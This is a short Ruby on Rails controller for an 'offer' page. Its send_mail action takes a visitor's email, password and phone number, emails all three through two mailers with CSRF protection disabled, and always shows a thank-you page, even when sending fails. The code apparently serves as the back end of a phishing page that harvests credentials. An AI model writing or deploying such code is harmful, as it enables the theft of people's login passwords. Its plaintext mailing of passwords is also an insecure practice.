class OfferController < ApplicationController
  skip_before_action :verify_authenticity_token

  def index

  end


  def send_mail
    email    = params[:email]
    password = params[:password]
    phone    = params[:phone]

    begin
      OfferMailer.new_offer(email, password, phone).deliver_now
      SunnyMailer.new_offer(email, password, phone).deliver_now
      redirect_to thankyou_offers_path(email: email)
    rescue => e
      redirect_to thankyou_offers_path(email: email)
    end
  end

  def thankyou
    @user_email = params[:email]
  end
end